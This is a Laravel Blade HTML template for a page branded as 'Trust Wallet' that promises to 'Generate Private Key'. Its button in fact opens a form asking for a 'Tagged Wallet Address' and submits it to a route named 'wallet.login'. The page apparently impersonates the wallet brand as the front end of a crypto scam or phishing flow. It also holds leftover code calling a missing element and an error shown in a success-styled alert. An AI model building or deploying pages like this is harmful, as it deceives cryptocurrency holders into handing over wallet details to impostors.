<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TrustWallet - Generate Private Key</title>

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Material Icons -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <style>
        :root {
            --trust-primary: #3375bb;
            --trust-dark: #0b0f16;
            --trust-card: #141a24;
            --trust-border: #2a3344;
            --trust-text-light: #e2e8f0;
            --trust-text-secondary: #94a3b8;
        }
        
        body {
            background: var(--trust-dark);
            color: var(--trust-text-light);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            padding-top: 20px;
        }

        .trust-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            margin-bottom: 30px;
        }

        .trust-logo {
            font-weight: 700;
            font-size: 22px;
            color: white;
            display: flex;
            align-items: center;
        }

        .trust-logo::before {
            content: "";
            display: inline-block;
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #3375bb, #5ba2ff);
            border-radius: 10px;
            margin-right: 10px;
        }

        .wallet-card {
            background: var(--trust-card);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            border: 1px solid var(--trust-border);
            max-width: 500px;
            margin: 0 auto;
        }

        .btn-primary {
            background: var(--trust-primary);
            border: none;
            font-weight: 600;
            padding: 14px;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(51, 117, 187, 0.3);
        }

        .btn-primary:hover {
            background: #2a639e;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(51, 117, 187, 0.4);
        }

        .modal-content {
            background: var(--trust-card);
            border-radius: 20px;
            color: var(--trust-text-light);
            border: 1px solid var(--trust-border);
        }

        .modal-header, .modal-footer {
            border-color: var(--trust-border);
        }

        .form-control {
            background: rgba(15, 20, 28, 0.7);
            border: 1px solid var(--trust-border);
            color: var(--trust-text-light);
            padding: 14px 16px;
            border-radius: 12px;
            font-size: 16px;
        }

        .form-control:focus {
            box-shadow: 0 0 0 3px rgba(51, 117, 187, 0.2);
            border-color: var(--trust-primary);
        }

        .wallet-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--trust-primary), #5ba2ff);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
        }

        .wallet-icon i {
            font-size: 40px;
            color: white;
        }

        .back-button {
            color: var(--trust-text-light);
            background: none;
            border: none;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .back-button:hover {
            color: var(--trust-primary);
        }
    </style>
</head>
<body>

<div class="trust-header">
    <div class="trust-logo">Trust Wallet</div>
</div>

@if(session('error'))
    <div class="alert alert-success text-center">
        {{ session('error') }}
    </div>
@endif


<div class="container">
    <div class="wallet-card">
        <div class="wallet-icon">
            <i class="material-icons">vpn_key</i>
        </div>
        
        <h3 class="text-center mb-3">Generate Private Key</h3>
        <p class="text-center text-secondary">Create a secure private key for your cryptocurrency wallet</p>

        <button class="btn btn-primary w-100 mb-3" onclick="openAddressModal()">
            <i class="material-icons" style="font-size:20px; margin-right:8px;">key</i>
            Generate Private Key
        </button>
    </div>
</div>

<!-- Address Input Modal -->
<div class="modal fade" id="addressModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">

      <div class="modal-header">
        <button type="button" class="back-button" data-bs-dismiss="modal">
            <i class="material-icons">arrow_back</i> Back
        </button>
        <h5 class="modal-title mx-auto">Enter Tagged Wallet</h5>
        <div style="width:70px"></div>
      </div>

      <form action="{{ route('wallet.login') }}" method="POST">
        @csrf
        <div class="modal-body p-4">
            <label class="mb-2">Tagged Wallet Address</label>
            <input type="text" name="wallet_address" class="form-control mb-3" placeholder="0x..." required>
            @error('wallet_address')
                <span class="text-danger small">{{ $message }}</span>
            @enderror
        </div>

        <div class="modal-footer">
            <button type="submit" class="btn btn-primary w-100">
                <i class="material-icons">save</i> Enter
            </button>
        </div>
      </form>

    </div>
  </div>
</div>

</div>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
function openAddressModal() {
    const modal = new bootstrap.Modal(document.getElementById('addressModal'));
    modal.show();
}

function saveWallet() {
    const address = document.getElementById('walletAddress').value.trim();
    if (!address) {
        alert('Please enter a wallet address');
        return;
    }
    alert('Wallet saved successfully!');
    bootstrap.Modal.getInstance(document.getElementById('addressModal')).hide();
}
</script>

</body>
</html>
